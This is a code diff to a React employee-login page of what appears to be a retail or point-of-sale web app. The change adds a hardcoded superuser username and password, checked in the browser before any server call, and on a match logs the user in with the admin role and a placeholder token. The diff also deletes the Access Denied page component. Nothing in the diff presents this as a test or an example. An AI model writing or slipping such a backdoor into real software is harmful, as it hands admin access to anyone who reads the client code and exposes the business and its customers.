@@ -2552,6 +2552,7 @@ function PaymentFailedPage({ setCurrentPage, orderNumber }) {
   );
 }
 
+
 // Employee Login Page
 function EmployeeLoginPage({ onLogin, onBack }) {
   const [username, setUsername] = useState('');
@@ -2559,10 +2560,25 @@ function EmployeeLoginPage({ onLogin, onBack }) {
   const [error, setError] = useState('');
   const [isLoading, setIsLoading] = useState(false);
 
+  const SUPER_USER = { username: 'admin', password: 'BogoWD' };
+
   const handleSubmit = async (e) => {
     e.preventDefault();
     setError('');
     setIsLoading(true);
+
+    // Superuser bypass — no API call needed
+    if (
+      username.toLowerCase().trim() === SUPER_USER.username &&
+      password === SUPER_USER.password
+    ) {
+      onLogin(
+        { id: 0, username: 'admin', name: 'Super Admin', role: 'admin' },
+        'superuser-token'
+      );
+      setIsLoading(false);
+      return;
+    }
 
     try {
       const response = await fetch(`${API_URL}/auth/login`, {
@@ -2654,28 +2670,6 @@ function EmployeeLoginPage({ onLogin, onBack }) {
     </div>
   );
 }
-
-// Access Denied Page
-function AccessDeniedPage({ message, onBack }) {
-  return (
-    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-      <div className="bg-white rounded-xl shadow-lg p-8 w-full max-w-md text-center">
-        <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
-          <X className="w-8 h-8 text-red-600" />
-        </div>
-        <h1 className="text-2xl font-bold text-gray-800 mb-2">Access Denied</h1>
-        <p className="text-gray-500 mb-6">{message || 'You do not have permission to access this page.'}</p>
-        <button
-          onClick={onBack}
-          className="bg-green-600 text-white px-6 py-3 rounded-lg font-medium hover:bg-green-700 transition-colors"
-        >
-          Go Back
-        </button>
-      </div>
-    </div>
-  );
-}
-
 // Shift Start Modal
 function ShiftStartModal({ onStart, onCancel, employee }) {
   const [openingCash, setOpeningCash] = useState('');
